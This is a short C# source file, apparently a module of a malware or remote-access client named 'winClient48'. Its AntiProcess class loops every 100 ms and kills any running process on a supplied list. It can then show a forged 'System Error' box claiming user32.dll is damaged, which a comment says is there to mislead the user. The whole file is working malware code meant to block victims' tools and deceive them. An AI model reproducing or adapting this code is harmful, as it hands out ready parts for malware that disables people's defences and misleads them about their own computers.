using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    internal class AntiProcess
    {
        public bool fake_msg = false;
        public bool anti_stop = false;

        public void Start(List<string> lsProcName)
        {
            anti_stop = false;
            new Thread(() =>
            {
                while (!anti_stop)
                {
                    foreach (string proc in lsProcName)
                    {
                        int success_cnt = 0;
                        string main_name = string.Empty;
                        foreach (Process p in Process.GetProcessesByName(proc))
                        {
                            try
                            {
                                p.Kill();
                                main_name = p.ProcessName;
                                success_cnt++;
                            }
                            catch (Exception ex)
                            {

                            }
                        }
                        if (fake_msg && success_cnt > 0)
                        {
                            //FAKE MESSAGE BOX TO MISLEAD USER.
                            MessageBox.Show($"Cannot open {main_name}, user32.dll is damaged.", "System Error(0x0012654)", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    Thread.Sleep(100);
                }
            }).Start();
        }

        public void Stop()
        {
            anti_stop = true;
        }
    }
}
